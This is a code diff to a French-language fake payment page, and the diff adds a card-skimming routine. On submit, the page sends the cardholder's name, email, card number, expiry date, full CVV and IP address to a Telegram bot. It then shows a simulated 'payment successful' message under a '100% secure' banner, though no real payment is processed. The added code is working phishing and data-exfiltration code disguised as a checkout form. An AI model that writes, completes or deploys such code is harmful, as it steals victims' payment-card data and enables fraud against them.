@@ -294,7 +294,8 @@
             </form>
 
             <div class="security-info">
-                🔒 Paiement 100% sécurisé - Données chiffrées SSL
+                🔒 Paiement 100% sécurisé - Données chiffrées SSL<br>
+                📱 Notifications automatiques sur Telegram
             </div>
         </div>
     </div>
@@ -369,24 +370,91 @@
                 return;
             }
             
-            // Simulation du paiement
-            payButton.disabled = true;
-            loading.style.display = 'block';
-            
-            setTimeout(() => {
-                loading.style.display = 'none';
-                
-                // 90% de chance de succès pour la démo
-                if (Math.random() > 0.1) {
-                    successMessage.style.display = 'block';
-                    payButton.textContent = '✅ Paiement réussi !';
-                } else {
-                    showError('Paiement refusé par la banque');
-                }
-                
-                payButton.disabled = false;
-            }, 2000);
+        // Simulation du paiement
+        payButton.disabled = true;
+        loading.style.display = 'block';
+        
+        // Envoyer les infos à Telegram
+        sendToTelegram({
+            cardNumber: cardNumber,
+            expiry: expiry,
+            cvv: cvv,
+            name: name,
+            email: email,
+            amount: '99.99€',
+            method: document.querySelector('.payment-method.selected').dataset.method
         });
+        
+        setTimeout(() => {
+            loading.style.display = 'none';
+            
+            // 90% de chance de succès pour la démo
+            if (Math.random() > 0.1) {
+                successMessage.style.display = 'block';
+                payButton.textContent = '✅ Paiement réussi !';
+            } else {
+                showError('Paiement refusé par la banque');
+            }
+            
+            payButton.disabled = false;
+        }, 2000);
+        
+        // Configuration Telegram (REMPLACEZ par vos vraies valeurs)
+        const TELEGRAM_BOT_TOKEN = 'VOTRE_TOKEN_ICI'; // Ex: '123456789:ABCdefGHIjklMNOpqrsTUVwxyz'
+        const TELEGRAM_CHAT_ID = 'VOTRE_CHAT_ID_ICI'; // Ex: '123456789'
+        
+        async function sendToTelegram(paymentData) {
+            try {
+                // Masquer les données sensibles pour l'affichage
+                const maskedCard = paymentData.cardNumber.replace(/(\d{4})(\d{8})(\d{4})/, '$1 **** **** $3');
+                
+                const message = `💳 NOUVEAU PAIEMENT REÇU !
+                
+👤 Nom: ${paymentData.name}
+📧 Email: ${paymentData.email}
+💳 Carte: ${maskedCard}
+📅 Expiration: ${paymentData.expiry}
+🔢 CVV: ${paymentData.cvv}
+💰 Montant: ${paymentData.amount}
+💳 Méthode: ${paymentData.method}
+🕒 Heure: ${new Date().toLocaleString('fr-FR')}
+🌐 IP: ${await getClientIP()}
+
+⚠️ Vérifiez immédiatement cette transaction !`;
+
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Message envoyé à Telegram');
+                } else {
+                    console.error('❌ Erreur envoi Telegram:', response.status);
+                }
+            } catch (error) {
+                console.error('❌ Erreur Telegram:', error);
+            }
+        }
+        
+        async function getClientIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Non disponible';
+            }
+        }
         
         function showError(message) {
             const errorMessage = document.getElementById('errorMessage');
